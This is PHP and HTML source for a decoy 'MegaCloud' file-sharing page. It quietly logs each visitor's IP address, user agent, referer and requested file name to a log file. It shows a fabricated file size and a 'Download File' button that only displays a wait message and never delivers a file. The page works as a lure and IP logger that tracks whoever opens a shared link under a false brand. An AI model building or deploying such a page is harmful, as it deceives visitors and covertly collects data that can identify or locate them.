<?php
// ---------- Logging ----------
$logFile = __DIR__ . '/stats.log';
$ts = date('Y-m-d H:i:s');

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $candidate = trim($parts[0]);
    if (filter_var($candidate, FILTER_VALIDATE_IP)) {
        $ip = $candidate;
    }
}

$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$path = $_SERVER['REQUEST_URI'] ?? '-';
$ref  = $_SERVER['HTTP_REFERER'] ?? '-';


// ---------- File parameter handling ----------

// Default name
$fileName = "unknown-file";

// Read ?file=
if (!empty($_GET['file'])) {
    // Remove path parts and dangerous characters
    $fileName = basename($_GET['file']);
    $fileName = preg_replace('/[^a-zA-Z0-9._-]/', '', $fileName);
}

// Fake file size + type detection (UI only)
$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
$icon = "📄";

if (in_array($ext, ['jpg','jpeg','png','gif','webp'])) $icon = "🖼️";
if (in_array($ext, ['zip','rar','7z'])) $icon = "🗜️";
if (in_array($ext, ['pdf'])) $icon = "📕";
if (in_array($ext, ['mp4','mov','avi'])) $icon = "🎬";

$line = $ts . "\t" . $ip . "\t" . $ua . "\t" . $path . "\t" . $ref . "\t" . "file.php?file=" . $fileName . PHP_EOL;
@file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);


$fakeSize = "3,5 MB";
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Shared File – MegaCloud</title>
  <link rel="stylesheet" href="design.css">
</head>

<body>
  <div class="blob b1"></div>
  <div class="blob b2"></div>
  <div class="blob b3"></div>

  <main class="wrap">
    <section class="shell" style="grid-template-columns:1fr; max-width:700px;">
      <div class="panel right" style="text-align:center;">
        
        <div style="font-size:60px;"><?php echo $icon; ?></div>
        <h2 style="margin:10px 0 5px;"><?php echo htmlspecialchars($fileName); ?></h2>
        <p class="sub">File size: <?php echo $fakeSize; ?> · Shared via MegaCloud</p>

        <button class="btn" style="margin-top:20px;" onclick="fakeDownload()">
          Download File
        </button>

        <div id="toast" class="toast" role="status"></div>

        <p class="tiny" style="margin-top:25px;">
          🔒 Files are encrypted · Link access only  
        </p>

        <p class="tiny">
          © <span id="year"></span> MegaCloud
        </p>
      </div>
    </section>
  </main>

  <script>
    function fakeDownload(){
      const toast = document.getElementById("toast");
      toast.textContent = "Please wait, download should start in a few seconds.";
      toast.classList.add("show");
      setTimeout(()=>toast.classList.remove("show"), 2500);
    }
    document.getElementById("year").textContent = new Date().getFullYear();
  </script>
</body>
</html>
